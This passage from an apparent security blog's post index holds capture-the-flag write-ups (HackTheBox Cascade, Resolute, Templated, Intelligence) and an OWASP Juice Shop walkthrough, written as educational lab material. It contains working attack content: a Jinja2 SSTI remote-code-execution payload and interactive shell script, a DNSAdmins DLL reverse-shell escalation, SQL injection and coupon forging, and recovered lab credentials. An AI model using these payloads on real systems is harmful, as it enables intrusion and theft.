(Windows Server 2008 R2 SP1)| dns-nsid:|_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39)88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-06-02 17:59:12Z)135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)445/tcp open microsoft-ds? syn-ack ttl 127636/tcp open tcpwrapped syn-ack ttl 1273268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)3269/tcp open tcpwrapped syn-ack ttl 1275985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.049154/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC49155/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC49157/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.049158/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC49170/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPCService Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windowsHost script results:| smb2-time:| date: 2022-06-02T18:00:04|_ start_date: 2022-06-02T17:53:42|_clock-skew: 0s| smb2-security-mode:| 2.1:|_ Message signing enabled and required| p2p-conficker:| Checking for Conficker.C or higher...| Check 1 (port 58041/tcp): CLEAN (Timeout)| Check 2 (port 51409/tcp): CLEAN (Timeout)| Check 3 (port 10882/udp): CLEAN (Timeout)| Check 4 (port 37793/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blockedSMBFirst stop, checking the anonymous login for SMB.smbclient -L \\\\\\\\10.10.10.182\\\\No luck. Moving onto RPCRPCrpcclient -U=&quot;&quot; 10.10.10.182 -NSuccessNow that we have an anonymous RPC shell, we can run enumdomusers to gather a list of users for later password-spraying.enumdomusersWith this list of users, we can copy it into a file and use awk to filter it.users.txtNow that we have a list of users, we can move onto LDAP and hopefully find a password.LDAPWith LDAP, we must first choose a naming context to enumerate:ldapsearch -h 10.10.10.182 -x -s base namingcontextsThe naming context we’re looking for is listed there as DC=cascade,DC=local. If we search this naming context without anyadditional filter, we’ll be given an overwhelming wall of text. We can significantly narrow down the search by targetingspecifically person domain objects and saving them to a file for filtering.ldapsearch -h 10.10.10.182 -x -b &quot;DC=cascade,DC=local&quot; &#39;(objectClass=person)&#39; &amp;gt; ldapPerson.txtcat ldapPerson.txt | grep -i &quot;pwd\\|pass&quot;clk0bjVldmE=We find a Base-64 encoded legacy password. We can easily decode this and use run it against our earlier list of users.rY4n5evaNow that we’ve got our password, it’s time to move onto CrackMapExec to see if we’ve got a hit yet.crackmapexec smb 10.10.10.182 -d cascade.local -u users.txt -p &quot;rY4n5eva&quot;r.thompsonWe’ve got credentials to enumerate SMB with.smbclient -L \\\\\\\\10.10.10.182\\\\ --user=&quot;r.thompson&quot;SMBAs r.thompson, we have permission to explore \\Data. After some enumerating, we find some files:\\\\\\\\10.10.10.182\\\\Data\\\\IT\\\\Email Archives\\\\Meeting_Notes_June_2018.html\\\\\\\\10.10.10.182\\\\Data\\\\IT\\\\Logs\\\\Ark AD Recycle Bin\\\\ArkAdRecycleBin.log\\\\\\\\10.10.10.182\\\\Data\\\\IT\\\\Logs\\\\DCs\\\\dcdiag.log\\\\\\\\10.10.10.182\\\\Data\\\\IT\\\\Temp\\\\s.smith\\\\VNC Install.regThe email from Steve Smith says an account called TempAdmin existed with a password the same as the normal admin password.TempAdminThis isn’t immediately useful but no doubt it will be later. The file most interesting to us right now is VNC Install.reg.VNC Install.reg------------------------------------Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\\SOFTWARE\\TightVNC][HKEY_LOCAL_MACHINE\\SOFTWARE\\TightVNC\\Server]&quot;ExtraPorts&quot;=&quot;&quot;&quot;QueryTimeout&quot;=dword:0000001e&quot;QueryAcceptOnTimeout&quot;=dword:00000000&quot;LocalInputPriorityTimeout&quot;=dword:00000003&quot;LocalInputPriority&quot;=dword:00000000&quot;BlockRemoteInput&quot;=dword:00000000&quot;BlockLocalInput&quot;=dword:00000000&quot;IpAccessControl&quot;=&quot;&quot;&quot;RfbPort&quot;=dword:0000170c&quot;HttpPort&quot;=dword:000016a8&quot;DisconnectAction&quot;=dword:00000000&quot;AcceptRfbConnections&quot;=dword:00000001&quot;UseVncAuthentication&quot;=dword:00000001&quot;UseControlAuthentication&quot;=dword:00000000&quot;RepeatControlAuthentication&quot;=dword:00000000&quot;LoopbackOnly&quot;=dword:00000000&quot;AcceptHttpConnections&quot;=dword:00000001&quot;LogLevel&quot;=dword:00000000&quot;EnableFileTransfers&quot;=dword:00000001&quot;RemoveWallpaper&quot;=dword:00000001&quot;UseD3D&quot;=dword:00000001&quot;UseMirrorDriver&quot;=dword:00000001&quot;EnableUrlParams&quot;=dword:00000001&quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f&quot;AlwaysShared&quot;=dword:00000000&quot;NeverShared&quot;=dword:00000000&quot;DisconnectClients&quot;=dword:00000001&quot;PollingInterval&quot;=dword:000003e8&quot;AllowLoopback&quot;=dword:00000000&quot;VideoRecognitionInterval&quot;=dword:00000bb8&quot;GrabTransparentWindows&quot;=dword:00000001&quot;SaveLogToAllUsersPath&quot;=dword:00000000&quot;RunControlInterface&quot;=dword:00000001&quot;IdleTimeout&quot;=dword:00000000&quot;VideoClasses&quot;=&quot;&quot;&quot;VideoRects&quot;=&quot;&quot;Inside the file, there’s an entry for a hex-encoded password separated by commas. After doing some research on VNC passwords,we firstly must remove the commas to turn the password from 6b,cf,2a,4b,6e,5a,ca,0f to 6bcf2a4b6e5aca0f.Searching for a tool to help from GitHub, I stumbled upon vncpwd. Echoing the passwordstraight into vncpwd doesn’t seem to do anything, we must run it through xxd to properly output it as a hexdump. No charactersleft behind../vncpwd &amp;lt;(echo &quot;6bcf2a4b6e5aca0f&quot; | xxd -r -ps)Password: sT333ve2With this new password, we can run it against CrackMapExec again.s.smithWith our new user, we’re afforded new SMB shares but first, we can get an Evil-WinRM session to grab the user flag.user.txtNow this is where things get interesting.RootAs well as getting access with Evil-WinRM, we were also granted access to additional shares in the SMB, namely Audit$.We can use the following command to recursively download everything in the Audit$ directory.smbclient \\\\\\\\10.10.10.182\\\\Audit$ sT333ve2 --user=&quot;s.smith&quot; -c &#39;prompt;recurse;mget *&#39;This will download everything in the defined share to your current directory. Amongst the files we have downloaded, thereare 4 files of interest:CascAudit.exe - .Net PECascCrypto.dll - Custom Cryptography LibraryAudit.db - SQLite DatabaseRunAudit.bat - Batch script to run the executable.RunAudit.bat simply contains CascAudit.exe &quot;\\\\CASC-DC1\\Audit$\\DB\\Audit.db&quot; showing us that CascAudit.exe takes the SQLite DB file as its only argument.To investigate the Audit.db database, we can run:sqlite3 Audit.dbIt’s a small enough file so we can coax all we need out of it by running .dump inside the SQLite shell. Inside the databasewe find an interesting entry:INSERT INTO Ldap VALUES(1,&#39;ArkSvc&#39;,&#39;BQO5l5Kj9MdErXx6Q6AGOw==&#39;,&#39;cascade.local&#39;);CREATE TABLE IF NOT EXISTS &quot;Misc&quot; ( &quot;Id&quot; INTEGER PRIMARY KEY AUTOINCREMENT, &quot;Ext1&quot; TEXT, &quot;Ext2&quot; TEXTIt seems like we’ve got the ArkSvc user and potentially a password encoded in Base-64. Should be easy, right? Simply decodethe Base-64, use it as a password to login to ArkSvc and profit? Well, not quite. It is in fact Base-64 but that’s not all it is.D|zC;If that value seems too short to be the result of decoding that Base-64, that’s because it is. By reversing the operationand Base-64 encoding D|zC;, we’re given a very different Base-64 value of RHx6QzsK. To confirm there’s something more goingon, we can pipe the Base-64 decoded value into xxd to see what it really is.Encrypted?That’s a lot of non-printable gibberish. Given the presence of CascCrypto.dll, it’s safe to assume it’s encrypted. What now?Reversing. I opened up CascAudit.exe in Ghidra, ready to take a stab at it and…Ghid… NahAbsolutely not. That is most definitely not the solution the author of this medium machine had in mind. Then I rememberthe PE is a .NET assembly. There’s tools for that. Tools that’ll keep me sane and happy, like DNSpy. I zip up the PE andall its dependencies and bounce it from my Kali-VM to my FLARE-VM to look at it with DNSpy.That’s betterInstant relief. Readable code. Inside the middle of that screenshot, we have our line of interest:password = Crypto.DecryptString(encryptedString, &quot;c4scadek3y654321&quot;);We’ve got our decryption key of c4scadek3y654321. Now we’ve got our encrypted value and the key to decrypt it. Now wejust need to find the DecryptString function in CascCrypto.dll to find out the rest such as algorithm etc.DecryptStringIt’s an AES-128 algorithm in CBC mode with an IV of 1tdyjCbY1Ix49842. This is all we need to retrieve that password.w3lc0meFr31ndWell that was ridiculously satisfying. ArkSvc:w3lc0meFr31nd. Time for another round of CrackMapExec.ArkSvcWe’re not done yet, this account cannot read the root flag. Throughout this box and even in Audit.db that we just used,there’s mention of a deleted TempAdmin account which had the same password as the current Administrator account. In share\\Data\\IT\\Logs\\Ark AD Recycle Bin\\ArkAdRecycleBin.log we see CASCADE\\ArkSvc deleting the account. Well, we’re now ArkSvc,can we recover it? Of course, the answer is yes:Get-ADObject -Filter:&#39;displayName -eq &quot;TempAdmin&quot;&#39; -IncludeDeletedObjects -property *TempAdmin LegacyPwdThere it is, the recovered password encoded in Base-64 like usual. Just one last decode.echo &quot;YmFDVDNyMWFOMDBkbGVz&quot; | base64 -dbaCT3r1aN00dlesWith the Administrator password recovered, we can log into Evil-WinRM and take the root flag.root.txt:)" }, { "title": "HackTheBox - Resolute", "url": "/posts/HackTheBox-Resolute/", "categories": "HackTheBox, Machines", "tags": "hackthebox, resolute, ldap, active_directory, rpc, smb, evil-winrm, bloodhound, dns, msfvenom", "date": "2022-06-01 02:00:00 +0000", "snippet": "HackTheBox ResoluteResolute is a retired medium Active Directory machine on HackTheBox, expanding on my Active Directoryexperience from the previous machine Intelligence.EnumerationInitially we can scan the full range and specify interesting ports for a more thorough scan.nmap -p- 10.10.10.169Scan:nmap -Pn -sC -sV -oA nmap -p 88,135,139,389,445,464,593,636,3268,3269,5985,9389 10.10.10.169Results:Nmap scan report for 10.10.10.169Host is up (0.050s latency).PORT STATE SERVICE VERSION88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-04-13 14:40:06Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)3269/tcp open tcpwrapped5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open mc-nmf .NET Message FramingService Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)| Computer name: Resolute| NetBIOS computer name: RESOLUTE\\x00| Domain name: megabank.local| Forest name: megabank.local| FQDN: Resolute.megabank.local|_ System time: 2022-04-13T07:40:08-07:00| smb2-security-mode: | 3.1.1: |_ Message signing enabled and required|_clock-skew: mean: 2h27m03s, deviation: 4h02m29s, median: 7m02s| smb-security-mode: | account_used: &amp;lt;blank&amp;gt;| authentication_level: user| challenge_response: supported|_ message_signing: required| smb2-time: | date: 2022-04-13T14:40:11|_ start_date: 2022-04-13T14:36:00It is typical of medium Linux machines on HackTheBox to be vulnerable through a web server. Active Directory machines havea lot of other services to be enumerated for an initial foothold and don’t strictly rely on web vulnerabilities, hencethe absence of an active port 80 this time around.SMBFirst stop is attempting an anonymous login to the machine’s SMB server and seeing what shares are accessible withoutcredentials.smbclient -L \\\\\\\\10.10.10.169\\\\No SharesWe find there is no shares available for anonymous enumeration, we can move onto RPC.RPCLike SMB, we’ll try get anonymous access to RPC.rpcclient -U=&quot;&quot; 10.10.10.169 -NSuccessWith anonymous access to RPC, we can run enumdomusers to get a list of users registered on the domain.enumdomusersWe can take these users and put them into a usable list for later password-spraying.users.txtWe’ve now got a list of users with no passwords. We can move onto LDAP to try find a password to use.LDAPTo search LDAP, we must first get the naming context of the domain to enumerate. We can get the naming context with:ldapsearch -h 10.10.10.169 -x -s base namingcontextsNaming ContextsWe can now refine our search to the relevant naming context and then refine it further down to person objects in the domain.ldapsearch -h 10.10.10.169 -x -b &quot;DC=megabank,DC=local&quot; &quot;(objectClass=person)&quot; &amp;gt; ldapPeople.txtThis command dumps an overwhelming amount of information regarding people in the domain, we can use grep to sort throughthis wall of text for meaningful information.cat ldapPeople.txt | grep -i &quot;pw\\|pwd\\|pass\\|password&quot;Welcome123!The grep filter worked flawlessly and we have found a default password of Welcome123!We now have a list of users and a default password.We can begin password-spraying. I use the smb_login Metasploit module for this.melanie:Welcome123!We now have a valid set of credentials to access the domain with. I tried using this user to find SMB shares but didn’tfind anything of interest. It turns out Melanie is a member of the Remote Management group and we can immediately getan Evil-WinRM session going.Evil-WinRMGetting user is as easy as getting an Evil-WinRM session with Melanie and reading the user flag from the desktop:User.txtRootWith the Evil-WinRM session, I searched around the file system for anything of interest and I found it in the root of theC drive with dir -force to reveal hidden directories.PSTranscriptsPSTranscripts sounds interesting, by following through the subdirectories we eventually come to:PowerShell_transcript.RESOLUTE.OjuoBGhU.20191203063201.txtInside this PowerShell transcript, we find another set of credentials, this time for the ryan user:Serv3r4Admin4cc123!We can end our Evil-WinRM session with Melanie and start one up with Ryan.note.txtWe find a file on Ryan’s desktop called note.txt that notifies the team that any system change apart from those to theadministrator account will be automatically reverted within 1 minute.We might get a clearer path forward by using Bloodhound.BloodhoundWe can use Bloodhound-Python to gather up all the information we need from the domain with our current access as Ryan.bloodhound-python -c all -u ryan -p &quot;Serv3r4Admin4cc123!&quot; -ns 10.10.10.169 -d MEGABANKImporting the generated JSON files into Bloodhound, it makes our path forward clearer than just enumerating informationin Evil-WinRM.DNSAdminsRyan is a member of the Contractors group which in turn makes Ryan a member of the DNSAdmins group. Doing a quick searchfor DNSAdmins privilege escalation, we come across this postwhich is detailing the path from DNSAdmins to SYSTEM. This abuse of dnscmd is also detailed on its LOLBAS entry here.As a member of the DNSAdmins group, Ryan has permissions to load arbitrary DLLs from attacker-controlled shares as a pluginto the DNS service. This approach to SYSTEM makes the earlier note on Ryan’s desktop clearer. It presumably prevents the boxfrom locking up in a botched attempt. The problem with this is mainly the fact that loading a DLL reverse shell straight fromthe likes of MSFVenom will hang the DNS service on the domain while the shell is active.For a CTF, we can hang the DNS service without consequence. In a live environment, hanging the DNS service might result in a badday in the office. IppSec has a great walkthrough of crafting a reverse shell that loads on a separate thread to keep DNSfunctionality while the shell is active which you can find timestamped here.With that out of the way, we can just hang the service while we grab root.txtExploitWe will begin by generating a simple reverse shell DLL with MSFVenom:MSFVenomWe will then setup a SMB Server with Impacket’s smbserver.py:SMB ServerNow with our SMB server hosting our malicious DLL, we can setup a listener on our machine to catch our SYSTEM shell and moveback to Ryan’s Evil-WinRM session.As per the note earlier, we have to call down our reverse shell and load it into the DNS service in the space of 1 minute.Plugin LoadedBack on our machine, we get confirmation that our DLL was served and loaded with the DNS restart. We now have our SYSTEM shellto retrieve the flag.root.txtOn account of using the MSFVenom shell, the DNS service is inactive while our shell is active:DNS TimeoutHowever, upon closing our shell, the DNS service springs back to life:DNS Active:)" }, { "title": "HackTheBox - Templated", "url": "/posts/HackTheBox-Templated/", "categories": "HackTheBox, Challenges", "tags": "hackthebox, templated, ssti, jinja2, scripting, python", "date": "2022-05-13 21:30:00 +0000", "snippet": "SSTI or Server-Side Template Injection is a vulnerability that always really confused me but at the same time, reallyinterested me. Add those together and I went about finding out how it worked.Templating is a way in which developers can take dynamic data from a source and incorporate it into the page. It doesthis by having placeholder variables written statically in the source and then having those variables replaced withthe dynamic data such as user input.In the case of Jinja2, these templates would be written in a way for the formatting engine to use them, such as inthe case of a 404 page:The page {{&#39;directory&#39;}} could not be foundWould render as:The page &#39;AAAAA&#39; could not be foundSSTI can occur when user input is concatenated into a template render rather than safely passed into the template.This allows the user to render their own “templates”.This is what is presumably happening in HackTheBox Templated. With a name like Templated and the only text on thepage referencing an under construction Jinja2 site, the vulnerability isn’t exactly hiding.Jinja2Requesting a random directory, we see it is reflected back into the 404 page.404We know it’s running Jinja2, we can try and request {{7 * 7}} to see if we can inject our own“template”.Jinja2 SSTINow it gets interesting. We have SSTI. Time to build a payload to get RCE on the container. In Python, everythingis an object and so everything involved in the Jinja2 server is accessible by bouncing around to different objects.For the first payload, we can bounce back a step to the string object by requesting:{{&quot;1337&quot;.__class__}}‘&amp;lt;class ‘str’&amp;gt;’Now that we’re in the &#39;&amp;lt;class &#39;str&#39;&amp;gt;&#39; object, we can take another step back to the base of the string object with:{{&quot;1337&quot;.__class__.__base__}}‘&amp;lt;class ‘object’&amp;gt;’Now we’re at the origin, since everything in Python is an object, everything inherits from this object meaning we canbounce around anywhere we want. We can stop taking steps back and instead take a step forward into a subclass that’ll allow us to execute commands. In order to enter the subclass we want, we first must list what subclasses are available for use:{{&quot;1337&quot;.__class__.__base__.__subclasses__()}}That’s a lot of subclassesControl + F is your friend. We can use it to search for classes that’ll help us out. In this instance, we can targetsubprocess.Popen. This operates like a regular Python list. We need to find the index of subprocess.Popen in thislist. I’ll go over how I found it later, but for now, it’s [414]:{{&quot;1337&quot;.__class__.__base__.__subclasses__()[414]}}subprocess.PopenNow that we’re right where we want to be. We can achieve RCE with this final payload:{{&quot;1337&quot;.__class__.__base__.__subclasses__()[414](&#39;cat flag.txt&#39;, shell=True, stdout=-1).communicate()[0]}}FlagNow, we’ve solved the challenge but that’s only half the fun. I’m now going to move onto making a nice script tointeract with the RCE. This script also includes how I found the index of subprocess.Popen.ScriptThe first half of the script will find the index of subprocess.Popen. In the interest of not slamming the challengewith ~600 requests to find the index, I ballparked it around 400 - 500. It then simply checked for subprocess.Popenin all of them and if it finds it, it sets the index in the URL for the second half of the script. You could easily hardcode the index after running it once and scrap this part of the script, but there’s no fun in that.#!/bin/env python3import requestschallenge = &quot;&quot;print(&quot;[+] Finding Subprocess...&quot;)for i in range(400,500): challenge = &quot;http://IP:PORT/{{&#39;abc&#39;.__class__.__base__.__subclasses__()[%s]}}&quot; %i r = requests.get(challenge) if &quot;subprocess.Popen&quot; in r.text: print(&quot;[+] Subprocess Found at [{}]&quot;.format(i)) breakNow that we have the index of subprocess.Popen, we can write the part of the script that’ll interact with it in aterminal-like interface.print(&quot;[+] Spawning Shell...&quot;)while True: try: command = input(&quot;Path-IX&amp;gt; &quot;) shell = challenge[:-2] + &quot;(&#39;%s&#39;, shell=True, stdout=-1).communicate()[0].decode(&#39;utf-8&#39;).strip()}}&quot; %command r = requests.get(shell) print(&quot;----------\\n&quot;+r.text[38:-30]+&quot;\\n----------&quot;) except KeyboardInterrupt: print(&quot;\\n[+] Quitting...&quot;) quit()Here it simply sets the RCE payload to whatever command is inputted and keeps it open in a constant loop untilKeyboardInterrupt. Added on some extra cleanup at the end of the payload to decode the output and I usedPython slices to cut down on the returned 404 message etc. The most satisfying part of writing a script isn’t getting it working, it’s making it look nice.Shell?Full script:#!/bin/env python3import requestschallenge = &quot;&quot;print(&quot;[+] Finding Subprocess...&quot;)for i in range(400,500): challenge = &quot;http://IP:PORT/{{&#39;abc&#39;.__class__.__base__.__subclasses__()[%s]}}&quot; %i r = requests.get(challenge) if &quot;subprocess.Popen&quot; in r.text: print(&quot;[+] Subprocess Found at [{}]&quot;.format(i)) breakprint(&quot;[+] Spawning Shell...&quot;)while True: try: command = input(&quot;Path-IX&amp;gt; &quot;) shell = challenge[:-2] + &quot;(&#39;%s&#39;, shell=True, stdout=-1).communicate()[0].decode(&#39;utf-8&#39;).strip()}}&quot; %command r = requests.get(shell) print(&quot;----------\\n&quot;+r.text[38:-30]+&quot;\\n----------&quot;) except KeyboardInterrupt: print(&quot;\\n[+] Quitting...&quot;) quit():)" }, { "title": "OWASP Top 10 - OWASP Juice Shop", "url": "/posts/OWASP-Top-10/", "categories": "Other, OWASP", "tags": "webapp, burpsuite, owasp", "date": "2022-05-10 17:30:00 +0000", "snippet": "The Open Web Application Security Project (OWASP) is a nonprofit that works to improve the security of softwareonline. Annually they release a list of the top 10 most common web application vulnerabilities to be mindful ofboth as a tester and as a developer. Familiarity with the vulnerabilities that make this list is a crucial partof being an effective bug hunter whether you are on a red-team assessment or chasing bug bounties.OWASP also maintain an open-source project called the OWASP Juice Shopwhich is home to all of these common vulnerabilities and some extra both for training and demonstration purposes.Normally with web applications, I like to use Burp Suite, but in the spirit of OWASP, I’ll be following along withOWASP Zap which is their free and open source Burp Suite competitor.I’m going to go through each item on the OWASP Top Ten 2021 and try exploit the ones available to me on the OWASP Juice Shop.OWASP Top 10 2021-----------------A01:2021 - Broken Access ControlA02:2021 - Cryptographic Failures (Formerly Sensitive Data Exposure)A03:2021 - InjectionA04:2021 - Insecure DesignA05:2021 - Security MisconfigurationA06:2021 - Vulnerable and Outdated ComponentsA07:2021 - Identification and Authentication Failures (Formerly Broken Authentication)A08:2021 - Software and Data Integrity FailuresA09:2021 - Security Logging and Monitoring FailuresA10:2021 - Server-Side Request ForgeryA01:2021 - Broken Access ControlBroken Access Control describes a vulnerability where a user is able to access or change resources they should nothave permissions to be accessing or changing. For example, accessing another user’s basket in the OWASP Juice Shop.Firstly, we need to understand how we access our own basket before finding out if we can access someone else’s.Create an account with on the Juice Shop, put something in your basket and click on Your Basket in the top right.My BasketEverything is normal, I put the Fruit Press in my basket, I clicked my basket and here it is. Now we can go to ourhistory tab in Zap or Burp to see the request that was sent to view my basket:GET http://127.0.0.1:3000/rest/basket/6It looks like 6 must be my account ID. What would happen if we knocked that 6 down to a 5? Would we get anotheruser’s basket? To find out we can enable request interception in Zap and modify that ID to match 5 instead of ourdestined 6./basket/5As you can see from the screenshot, I have modified the ID and we can send it on using the blue arrow underlinedabove.A01:2021 - Broken Access ControlThere it is, we have successfully accessed another user’s basket.A02:2021 - Cryptographic FailuresCryptographic Failures describes a vulnerability where secrets can be accessed by users as a result of weak cryptography. For example, encoding secrets instead of encrypting them or using weak hashing algorithms such as MD5.The Juice Shop doesn’t have a whole lot of challenges in relation to this topic so the one I have chosen to demonstrateis forging a coupon.In /ftp, there are two files of current interest: coupons_2013.md.bak and package.json.bak. Trying to accessthese files regularly will result in a 403, however you can access them by adding %2500.md to the end of the requestwhich is simply just URL-encoded %00.coupons_2013.md.bak contains:n&amp;lt;MibgC7snmNYS#gC7sno*IVigC7snk#pDlgC7sno*I]pgC7snn(XRvgC7snn(XLtgC7snk#*AfgC7snq:&amp;lt;IqgC7snpEw8ogC7snpes[BgC7snl}6D$gC7ssWhich currently isn’t much good. Inside package.json.bak is a list of dependencies used by the Juice Shop, amongthem is a dependency called z85 running version 0.0. Searching for z85 reveals that it is an encoding algorithm.Assuming the contents of coupons_2013.md.bak are encoded using z85, we can reverse the encoding to find out thecontents. Downloading this package, we can successfully do this.z85 --decode &quot;n&amp;lt;MibgC7sn&quot; returns JAN13-10z85 --decode &quot;mNYS#gC7sn&quot; returns FEB13-10We now know what format the coupons are issued in, now we can modify a valid coupon found at @owasp_juiceshop.Writing this, the current valid coupon is o*I]qga+mn.z85 --decode &quot;o*I]qga+mn&quot; returns MAY22-20We can now modify this to give us a much better discount:z85 --encode &quot;MAY22-90&quot; returns o*I]qga+HuThis is now a forged, currently valid 90% off discount coupon.A02:2021 - Cryptographic FailuresA03:2021 - InjectionInjection describes a vulnerability where user-supplied data is not validated, filtered or sanitized by the application.One of the most common and devastating kinds of injection would be SQL Injection. SQL Injection is a vulnerabilitywhere that user-supplied data is included unsanitized in a SQL query. For example, when logging in to the Juice Shop,the server will take your email and password and throw it into a SQL query to find your account in the database.An example query might look like:SELECT * FROM users WHERE email = &#39;slimicide@juice-shop.com&#39; AND password = &#39;123&#39;In this instance, the email and password are user-supplied data. Since the query is unsanitized, we can simply cut thequery short and bypass the need for a password. If we wanted to take over the admin account and we don’t have a password,we can simply submit our login email as admin@juice-sh.op&#39;--&#39; closes the query field and -- is a comment in SQL. This results in the part of the query asking for a password to becommented out leaving the final query to look like:SELECT * FROM users WHERE email = &#39;admin@juice-sh.op&#39;--’ AND password = ‘123’This of course, will return the admin user.SQL InjectionA03:2021 - InjectionA04:2021 - Insecure DesignInsecure Design is a very broad category and one that is hard to define in terms of the Juice Shop.Insecure Design is more so a thought saying “Well that’s probably not a good idea” rather than a concretedefinition of a vulnerability. For example, having the /ftp directory available on the Juice Shop from earlier definitelyfits this description. It’s not a vulnerability in itself but relying on 403s to keep unauthorized parties out of sensitivedocuments probably isn’t secure design, especially when those documents aren’t required at all by the application andalso because we can bypass the 403 with little to no effort.A05:2021 - Security MisconfigurationSecurity Misconfiguration describes a vulnerability in which a web application has some controls inaccuratelyconfigured or left insecure. For example, applications with default credentials enabled or a file upload filter bypass.For our Juice Shop example, we have a challenge called Deprecated Interface where we are told we can use a B2B interfacethat was not properly shut down.In order to find remnants of old features, we can look to the site’s complaint page. They allow uploads of .zip and.pdf files. In main.js we can find the upload functionality:this.uploader = new kt.bA({ url: &#39;./file-upload&#39;, authToken: `Bearer ${ localStorage.getItem(&#39;token&#39;) }`, allowedMimeType: [ &#39;application/pdf&#39;, &#39;application/xml&#39;, &#39;text/xml&#39;, &#39;application/zip&#39;, &#39;application/x-zip-compressed&#39;, &#39;multipart/x-zip&#39; ], maxFileSize: 100000 }),The upload dialogue box shows only .pdf and .zip are supported, however looking at main.js, .xml is alsosupported despite the dialogue box not showing it. We can make a quick harmless .xml file and upload it to /#/complainA05:2021 - Security MisconfigurationA06:2021 - Vulnerable and Outdated ComponentsNothing ambiguous about this title. Out of date software has vulnerabilities, using it makes you vulnerable.We have a list of dependencies from earlier in /ftp/package.json.bak%2500.md. We can simply search for them inRetire.js.sanitize-html &amp;lt;= 1.4.3 does not recursively sanitize input, making it vulnerable to XSS.A07:2021 - Identification and Authentication FailuresIdentification and Authentication Failures describes a class of vulnerability involving weak authentication or poor session management. Examples include: weak passwords, session hijacking and insecure password recovery mechanisms.For the Juice Shop, we’re going to reset Bender’s password. The Juice Shop’s password recovery process involvessecurity questions with knowledge-based answers that people other than the account holder could know. It’s probablysafe to assume Bender is referencing the robot from Futurama. His security question is:Company you first work for as an adult?A quick Google search reveals the answer is Stop&#39;n&#39;Drop and we successfully reset Bender’s password. Had an emailbeen sent to bender@juice-sh.op to reset his password, we would probably have a significantly tougher time.A07:2021 - Identification and Authentication FailuresA08:2021 - Software and Data Integrity FailuresSoftware and Data Integrity Failures refers to a class of vulnerabilities that are introduced to a system throughplugins, libraries or modules from untrusted sources. Insecure Deserialization is also included in there.As I have just found out, the Insecure Deserialization challenges aren’t available on the Juice Shop when runningit in a Docker container like I am so I cannot demonstrate this one.A09:2021 - Security Logging and Monitoring FailuresSecurity Logging and Monitoring Failures refers to the failure of a web application to collect any meaningful logsabout activity happening on the application. The Juice Shop’s logs are publicly exposed at /support/logs and we cantake a look inside to see what information is being collected. These logs don’t reveal anything beyond successful requeststo server resources. They collect the resource accessed and the user-agent. They don’t log important events such asunsuccessful/successful logins, active scanning or password resets.A10:2021 - Server-Side Request ForgeryServer-Side Request Forgery is a vulnerability in which the server can be tricked into making web requests for you, typicallyto access resources only available to the server. SSRF is a personal favorite of mine and is incredibly annoying to pull off on the Juice Shop. Thankfully, I have a write-up of one of my favorite HackTheBox machines Forge listed here.Forge required a lot of playing around with SSRF to complete the User section of the box and is a much more detailedlook at the vulnerability than I could have done on the Juice Shop. That write-up is also home to the Mona Lisa of MS-Paint diagrams.:)" }, { "title": "HackTheBox - Intelligence", "url": "/posts/HackTheBox-Intelligence/", "categories": "HackTheBox, Machines", "tags": "hackthebox, intelligence, active_directory, exiftool, scripting, smb, responder, bloodhound, silver_ticket", "date": "2022-05-05 17:30:00 +0000", "snippet": "HackTheBox IntelligenceIntelligence is a retired medium Active Directory machine on HackTheBox, this machine was my first realdive into Active Directory exploitation and it was the perfect machine to do it with, I had a lot of fun working throughthis one.EnumerationActive Directory machines have a lot of ports open on them. We can just do a thorough scan of the results of:nmap -p- 10.10.10.248Scan:nmap -sC -sV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA nmap 10.10.10.248Results:Nmap scan report for 10.10.10.248Host is up (0.044s latency).PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0| http-methods: |_ Potentially risky methods: TRACE|_http-title: Intelligence88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-04-10 23:27:52Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc.intelligence.htb| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:dc.intelligence.htb| Not valid before: 2021-04-19T00:43:16|_Not valid after: 2022-04-19T00:43:16|_ssl-date: 2022-04-10T23:29:21+00:00; +7h00m02s from scanner time.445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over 